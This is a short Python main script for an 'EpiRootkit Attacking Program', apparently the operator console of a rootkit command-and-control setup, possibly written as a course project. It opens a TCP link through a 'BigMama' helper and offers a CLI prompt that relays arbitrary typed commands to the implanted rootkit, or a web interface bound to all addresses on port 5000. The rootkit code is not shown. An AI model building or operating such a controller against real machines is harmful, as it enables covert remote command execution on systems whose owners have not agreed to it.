from utils.BigMama import BigMama
import config as cfg
import threading
from app import app

# -------------------------------- MAIN MENU -------------------------------- #

def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    else:
        cfg.rootkit_connexion = BigMama(tcp_host=cfg.HOST, tcp_port=cfg.PORT)
        cfg.rootkit_connexion.start()
        app.run(host='0.0.0.0', port=5000)

# -------------------------------- RUN CLI -------------------------------- #

def run_cli():
    cfg.rootkit_connexion = BigMama(tcp_host=cfg.HOST, tcp_port=cfg.PORT)
    cfg.rootkit_connexion.start()
    while(cfg.rootkit_connexion._running):
        try:
            cmd = input("EpiRootkit> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                cfg.rootkit_connexion.stop()
                break
            elif cmd:
                cfg.rootkit_connexion.send(cmd)
        except KeyboardInterrupt:
            print("\nExiting...")
            cfg.rootkit_connexion.stop()
            break

if __name__ == '__main__':
    main()